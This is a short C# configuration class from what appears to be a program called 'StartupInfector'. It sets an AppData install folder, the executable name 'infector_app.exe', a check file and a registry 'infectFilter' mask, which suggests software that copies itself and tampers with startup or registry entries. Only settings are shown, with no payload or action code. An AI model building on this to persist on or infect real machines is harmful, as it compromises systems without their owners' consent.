using System;
using System.Diagnostics;
using System.IO;

namespace StartupInfector
{
    class appConfing
    {
        public static string MyFullPath { get { return Process.GetCurrentProcess().MainModule.FileName; } }

        public static bool InstallApp = true;

        public static string checkFile { get; set; } = "checkfile0.tmp";

        public static string targetDirName { get; set; } = "StartUp Infector";
        public static string targetExeName { get; set; } = "infector_app.exe";

        public static string targetDirPath { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), targetDirName); } }
        public static string targetFullPath { get { return Path.Combine(targetDirPath, targetExeName); } }

        public static cRegistry.AddMask infectFilter { get; set; } = cRegistry.AddMask.NoAddEmptyPath;
    }
}
